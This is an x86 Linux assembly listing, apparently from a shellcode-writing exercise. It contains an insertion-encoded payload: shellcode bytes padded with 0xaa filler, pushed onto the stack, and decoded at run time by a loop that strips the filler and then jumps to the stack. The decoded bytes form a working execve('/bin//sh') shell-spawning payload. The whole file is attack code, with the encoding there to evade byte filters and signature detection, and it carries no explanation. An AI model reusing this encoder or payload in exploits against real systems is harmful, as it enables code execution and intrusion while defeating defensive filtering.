	section .text
	global _start
_start:
	; encoded shellcode
	push 0x909090aa
	push 0xaaaaaaaa
	push 0x80aaaaaa
	push 0xaacdaaaa
	push 0xaaaa0baa
	push 0xaaaaaaaa
	push 0xb0aaaaaa
	push 0xaae1aaaa
	push 0xaaaaaa89
	push 0xaaaaaa53
	push 0xaaaaaac2
	push 0xaa89aaaa
	push 0xaaaa50aa
	push 0xaaaaaaaa
	push 0xe3aaaa89
	push 0xaaaa6eaa
	push 0xaa69aaaa
	push 0xaaaa62aa
	push 0xaaaaaa2f
	push 0xaa68aaaa
	push 0x68aaaaaa
	push 0xaaaa73aa
	push 0xaaaa2faa
	push 0xaa2faaaa
	push 0xaa68aaaa
	push 0x50aaaaaa
	push 0xaaaac0aa
	push 0xaaaaaa31

	; prepare registers for decoding
	mov esi, esp
	mov edi, esp
	mov bl, 0xaa

decoder:
	lodsb		; read byte from stack
	cmp al, bl	; check: is it trash byte?
	jz loopy	; if so, repeat
	cmp al, 0x90	; is it end of shellcode?
	jz exec		; if so, go to start of shellcode
	stosb		; if not, place byte of shellcode into stack
loopy:	jmp decoder	; repeat

exec:	jmp esp		; give flow control to shellcode
